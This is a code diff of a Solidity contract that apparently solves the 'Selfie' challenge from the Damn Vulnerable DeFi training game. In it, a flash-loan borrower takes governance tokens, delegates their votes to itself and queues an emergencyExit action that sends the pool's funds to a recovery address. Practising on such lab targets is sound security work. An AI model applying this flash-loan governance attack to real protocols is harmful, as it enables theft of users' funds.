@@ -7,21 +7,32 @@ import {
 import {
     IERC3156FlashLender
 } from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
-import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+import {DamnValuableVotes} from "../DamnValuableVotes.sol";
+import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
+import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
-contract MalicousBorrower is IERC3156FlashBorrower {
+contract MaliciousBorrower is IERC3156FlashBorrower {
+    SimpleGovernance governance;
     IERC3156FlashLender public immutable lender;
-    IERC20 public immutable token;
+    DamnValuableVotes public immutable token;
     address public immutable player;
+    address public recovery;
+    uint256 public actionId;
 
-    constructor(address _lender, address _token) {
+    constructor(address _lender, DamnValuableVotes _token) {
         lender = IERC3156FlashLender(_lender);
         token = _token;
         player = msg.sender;
     }
 
-    function executeFlashLoan(uint256 amount) external {
-        lender.flashLoan(this, token, amount, "");
+    function executeFlashLoan(
+        uint256 amount,
+        SimpleGovernance _governance,
+        address _recovery
+    ) external {
+        governance = _governance;
+        recovery = _recovery;
+        lender.flashLoan(this, address(token), amount, "");
     }
 
     function onFlashLoan(
@@ -32,9 +43,15 @@ contract MalicousBorrower is IERC3156FlashBorrower {
         bytes calldata data
     ) external returns (bytes32) {
         //delegate voting power
-        // token.delegate(player);
+        token.delegate(address(this));
+        bytes memory data2 = abi.encodeCall(
+            SelfiePool.emergencyExit,
+            (recovery)
+        );
+        actionId = governance.queueAction(address(lender), 0, data2);
+
         // Must approve the lender to take the loan back.
-        IERC20(tokenAddress).approve(msg.sender, amount + fee);
+        DamnValuableVotes(tokenAddress).approve(msg.sender, amount + fee);
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
